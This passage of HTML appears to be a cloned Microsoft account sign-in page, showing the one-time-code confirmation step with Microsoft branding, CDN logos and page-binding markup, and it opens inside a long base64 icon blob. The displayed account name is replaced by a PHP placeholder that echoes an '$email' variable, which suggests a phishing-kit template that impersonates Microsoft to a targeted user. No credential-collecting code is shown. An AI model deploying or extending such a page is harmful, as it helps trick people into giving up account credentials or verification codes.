AAAAAAAAAAAAPAAAAAAAAAAAAAAAPAAAAAAAAAAAAAAAPAAAAAAAAAAAAAAAPAAAAAAAAAAAAAAAPAAAAAAAAAAoAAAAMAAAAGAAAAABAAQAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP///wDvpAAAALn/AAC6fwAiUPIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMyIiIiIiIiIiIiIiIAMzMzMzMzMzMzMzMwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERFVVVVVVVVVVVVVVUARERERERERERERERAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAD///////8AAP///////wAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAGAAAAAACgAAAAgAAAAQAAAAAEABAAAAAAAgAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AO+kAAAAuf8AALx7AB9M+QAiUPIA96YAAAC6fwDzpgAAHk72ACNO9ADzpAAAALx9AAC6fQAAAAAAIiIiIiIiIsADMzMzMzMzMyIiIiIiIiLAAzMzMzMzMzMiIiIiIiIiwAMzMzMzMzMzIiIiIiIiIsADMzMzMzMzMyIiIiIiIiLAAzMzMzMzMzMiIiIiIiIiwAMzMzMzMzMzIiIiIiIiIsADMzMzMzMzMyIiIiIiIiLAAzMzMzMzMzMiIiIiIiIiwAMzMzMzMzMzIiIiIiIiIsADMzMzMzMzMyIiIiIiIiLAAzMzMzMzMzMiIiIiIiIiwAMzMzMzMzMzIiIiIiIiIsADMzMzMzMzMyIiIiIiIiLAAzMzMzMzMzOZmZmZmZmZcAMzMzMzMzMzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACqqqqqqqqqUATu7u7u7u7uZmZmZmZmZrANiIiIiIiIiGZmZmZmZmawDYiIiIiIiIhmZmZmZmZmsA2IiIiIiIiIZmZmZmZmZrANiIiIiIiIiGZmZmZmZmawDYiIiIiIiIhmZmZmZmZmsA2IiIiIiIiIZmZmZmZmZrANiIiIiIiIiGZmZmZmZmawDYiIiIiIiIhmZmZmZmZmsA2IiIiIiIiIZmZmZmZmZrANiIiIiIiIiGZmZmZmZmawDYiIiIiIiIhmZmZmZmZmsA2IiIiIiIiIZmZmZmZmZrANiIiIiIiIiGZmZmZmZmawDYiIiIiIiIgAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAD//////////wABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAAAABgAAAAYAAAAGAACgAAAAYAAAAMAAAAAEABAAAAAAAgAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AO+kAAAAuf8AALp/ACJQ8gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwIiIiIiIgMzMzMzMwAAAAAAAAAAAAAAAAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERAVVVVVVVQRERERERA////AAAQAQAAEAEAABABAAAQAQAAEAEAABABAAAQAQAAEAEAABABAAAQAQAAEAEA////AAAQAQAAEAEAABABAAAQAQAAEAEAABABAAAQAQAAEAEAABABAAAQAQAAEAEAKAAAABAAAAAgAAAAAQAEAAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD///8A76QAAAC5/wAAun8AHk73AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIiIiAzMzMwIiIiIDMzMzAiIiIgMzMzMCIiIiAzMzMwIiIiIDMzMzAiIiIgMzMzMCIiIiAzMzMwAAAAAAAAAABVVVVQREREQFVVVVBERERAVVVVUEREREBVVVVQREREQFVVVVBERERAVVVVUEREREBVVVVQREREQP//AAABAQAAAQEAAAEBAAABAQAAAQEAAAEBAAABAQAA//8AAAEBAAABAQAAAQEAAAEBAAABAQAAAQEAAAEBAAA=">
  <style>
    .sf-hidden {
      display: none !important
    }
  </style>
  <link rel=canonical href="https://login.live.com/ppsecure/post.srf?cobrandid=90015&amp;id=292841&amp;contextid=5C616DD2C63479D9&amp;opid=BFB28D92A0C70A66&amp;bk=1676786948&amp;uaid=9961159c30fc4468a1b012be6a48cda3&amp;pid=0">
  <meta http-equiv=content-security-policy>
  <style>
    img[src="data:,"],
    source[src="data:,"] {
      display: none !important
    }
  </style>
  <body class=cb data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
      <form name=form novalidate spellcheck=false method=post target=_top autocomplete=off data-bind="submit: form_onSubmit, autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="https://login.live.com/ppsecure/post.srf?cobrandid=90015&amp;id=292841&amp;contextid=5C616DD2C63479D9&amp;opid=BFB28D92A0C70A66&amp;bk=1676786961&amp;uaid=9961159c30fc4468a1b012be6a48cda3&amp;pid=0&amp;route=R3_BAY">
        <div data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.F,
            showFooterLinks: true,
            handleWizardButtons: false,
            useWizardBehavior: svr.bD },
        event: {
            footerAgreementClick: footer_agreementClick } }">
          <div id=lightboxTemplateContainer data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.cM }" class=provide-min-height>
            <div id=lightboxBackgroundContainer data-bind="css: { 'provide-min-height': svr.co },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }">
              <div class=background-image-holder role=presentation data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                <div id=backgroundImage data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIwIiBoZWlnaHQ9IjEwODAiIGZpbGw9Im5vbmUiPjxnIG9wYWNpdHk9Ii4yIiBjbGlwLXBhdGg9InVybCgjRSkiPjxwYXRoIGQ9Ik0xNDY2LjQgMTc5NS4yYzk1MC4zNyAwIDE3MjAuOC02MjcuNTIgMTcyMC44LTE0MDEuNlMyNDE2Ljc3LTEwMDggMTQ2Ni40LTEwMDgtMjU0LjQtMzgwLjQ4Mi0yNTQuNCAzOTMuNnM3NzAuNDI4IDE0MDEuNiAxNzIwLjggMTQwMS42eiIgZmlsbD0idXJsKCNBKSIvPjxwYXRoIGQ9Ik0zOTQuMiAxODE1LjZjNzQ2LjU4IDAgMTM1MS44LTQ5My4yIDEzNTEuOC0xMTAxLjZTMTE0MC43OC0zODcuNiAzOTQuMi0zODcuNi05NTcuNiAxMDUuNjAzLTk1Ny42IDcxNC0zNTIuMzggMTgxNS42IDM5NC4yIDE4MTUuNnoiIGZpbGw9InVybCgjQikiLz48cGF0aCBkPSJNMTU0OC42IDE4ODUuMmM2MzEuOTIgMCAxMTQ0LjItNDE3LjQ1IDExNDQuMi05MzIuNFMyMTgwLjUyIDIwLjQgMTU0OC42IDIwLjQgNDA0LjQgNDM3Ljg1IDQwNC40IDk1Mi44czUxMi4yNzYgOTMyLjQgMTE0NC4yIDkzMi40eiIgZmlsbD0idXJsKCNDKSIvPjxwYXRoIGQ9Ik0yNjUuOCAxMjE1LjZjNjkwLjI0NiAwIDEyNDkuOC00NTUuNTk1IDEyNDkuOC0xMDE3LjZTOTU2LjA0Ni04MTkuNiAyNjUuOC04MTkuNi05ODQtMzY0LjAwNS05ODQgMTk4LTQyNC40NDUgMTIxNS42IDI2NS44IDEyMTUuNnoiIGZpbGw9InVybCgjRCkiLz48L2c+PGRlZnM+PHJhZGlhbEdyYWRpZW50IGlkPSJBIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDE0NjYuNCAzOTMuNikgcm90YXRlKDkwKSBzY2FsZSgxNDAxLjYgMTcyMC44KSI+PHN0b3Agc3RvcC1jb2xvcj0iIzEwN2MxMCIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1jb2xvcj0iI2M0YzRjNCIgc3RvcC1vcGFjaXR5PSIwIi8+PC9yYWRpYWxHcmFkaWVudD48cmFkaWFsR3JhZGllbnQgaWQ9IkIiIGN4PSIwIiBjeT0iMCIgcj0iMSIgZ3JhZGllbnRVbml0cz0idXNlclNwYWNlT25Vc2UiIGdyYWRpZW50VHJhbnNmb3JtPSJ0cmFuc2xhdGUoMzk0LjIgNzE0KSByb3RhdGUoOTApIHNjYWxlKDExMDEuNiAxMzUxLjgpIj48c3RvcCBzdG9wLWNvbG9yPSIjMDA3OGQ0Ii8+PHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjYzRjNGM0IiBzdG9wLW9wYWNpdHk9IjAiLz48L3JhZGlhbEdyYWRpZW50PjxyYWRpYWxHcmFkaWVudCBpZD0iQyIgY3g9IjAiIGN5PSIwIiByPSIxIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgZ3JhZGllbnRUcmFuc2Zvcm09InRyYW5zbGF0ZSgxNTQ4LjYgOTUyLjgpIHJvdGF0ZSg5MCkgc2NhbGUoOTMyLjQgMTE0NC4yKSI+PHN0b3Agc3RvcC1jb2xvcj0iI2ZmYjkwMCIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PHJhZGlhbEdyYWRpZW50IGlkPSJEIiBjeD0iMCIgY3k9IjAiIHI9IjEiIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIiBncmFkaWVudFRyYW5zZm9ybT0idHJhbnNsYXRlKDI2NS44IDE5OCkgcm90YXRlKDkwKSBzY2FsZSgxMDE3LjYgMTI0OS44KSI+PHN0b3Agc3RvcC1jb2xvcj0iI2Q4M2IwMSIgc3RvcC1vcGFjaXR5PSIuNzUiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiNjNGM0YzQiIHN0b3Atb3BhY2l0eT0iMCIvPjwvcmFkaWFsR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJFIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwaDE5MjB2MTA4MEgweiIvPjwvY2xpcFBhdGg+PC9kZWZzPjwvc3ZnPg==)" class="background-image ext-background-image"></div>
              </div>
            </div>
            <div class=outer data-bind="css: { 'app': $page.backgroundLogoUrl }">
              <div class="template-section main-section">
                <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                  <div class=full-height data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                    <div class=flex-column>
                      <div class=win-scroll>
                        <div id=lightbox data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox">
                          <div class=lightbox-cover data-bind="css: { 'disable-lightbox': svr.CF &amp;&amp; isRequestPending() }"></div>
                          <div>
                            <div data-bind="component: { name: 'logo-control',
                params: {
                    isChinaDc: svr.fIsChinaDc,
                    bannerLogoUrl: $tfaPage.bannerLogoUrl() } }">
                              <img class=logo role=img pngsrc=https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png svgsrc=https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+ alt=Microsoft>
                            </div>
                            <div role=main data-bind="component: { name: 'pagination-control',
                    publicMethods: paginationControlMethods,
                    params: {
                        enableCssAnimation: svr.a7,
                        disableAnimationIfAnimationEndUnsupported: svr.Cl,
                        initialViewId: initialViewId,
                        initialSharedData: initialSharedData,
                        initialError: $tfaPage.serverError },
                    event: {
                        cancel: paginationControl_onCancel,
                        load: paginationControlHelper.onLoad,
                        unload: paginationControlHelper.onUnload,
                        loadView: view_onLoadView,
                        showView: view_onShow,
                        setLightBoxFadeIn: view_onSetLightBoxFadeIn } }">
                              <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
                                <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class=slide-in-next>
                                  <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.b9,
                displayName: sharedData.displayName || svr.i,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
                                    <div class=identityBanner>
                                      <button type=button class=backButton data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id=idBtn_Back aria-label=Back>
                                        <img role=presentation pngsrc=https://logincdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png svgsrc=https://logincdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg data-bind=imgSrc src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cGF0aCBkPSJNMTgsMTEuNTc4di44NDRINy42MTdsMy45MjEsMy45MjgtLjU5NC41OTRMNiwxMmw0Ljk0NC00Ljk0NC41OTQuNTk0TDcuNjE3LDExLjU3OFoiIGZpbGw9IiM0MDQwNDAiLz48cGF0aCBkPSJNMTAuOTQ0LDcuMDU2bC41OTQuNTk0TDcuNjE3LDExLjU3OEgxOHYuODQ0SDcuNjE3bDMuOTIxLDMuOTI4LS41OTQuNTk0TDYsMTJsNC45NDQtNC45NDRtMC0uMTQxLS4wNzEuMDdMNS45MjksMTEuOTI5LDUuODU4LDEybC4wNzEuMDcxLDQuOTQ0LDQuOTQ0LjA3MS4wNy4wNzEtLjA3LjU5NC0uNTk1LjA3MS0uMDctLjA3MS0uMDcxTDcuODU4LDEyLjUyMkgxOC4xVjExLjQ3OEg3Ljg1OGwzLjc1MS0zLjc1Ny4wNzEtLjA3MS0uMDcxLS4wNy0uNTk0LS41OTUtLjA3MS0uMDdaIiBmaWxsPSIjNDA0MDQwIi8+PC9zdmc+>
                                      </button>
                                      <div id=displayName class=identity data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"><?php echo($email); ?></div>
                                    </div>
                                  </div>
                                </div>
                                <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.i),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
                                  <div data-viewid=1 data-showidentitybanner=true data-bind="pageViewComponent: { name: 'otc-confirm-view',
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        username: sharedData.username,
                        focusDefaultField: true,
                        supportsBack: true,
